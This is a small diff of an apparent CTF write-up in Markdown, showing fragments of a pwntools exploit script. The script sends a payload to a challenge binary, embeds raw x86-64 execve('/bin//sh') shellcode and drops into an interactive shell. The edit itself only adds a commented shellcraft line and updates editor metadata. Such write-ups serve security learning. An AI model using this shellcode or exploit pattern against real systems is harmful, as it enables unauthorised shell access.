@@ -147,7 +147,7 @@ p.sendline(str(v4_addr))
 p.recvuntil("is:")
 p.sendline(pay)
 
-
+# shellcode=shellcraft.sh()
 shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05" 
 
 p.recvuntil("USE YOU SPELL")
@@ -176,6 +176,6 @@ p.sendline(pay)
 p.interactive()
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTg2MDkzMjUxMiwxNDMxNzU2Mzk0LDYwNT
-Q2NzExXX0=
+eyJoaXN0b3J5IjpbODE5NTQyMTk5LDE4NjA5MzI1MTIsMTQzMT
+c1NjM5NCw2MDU0NjcxMV19
 -->
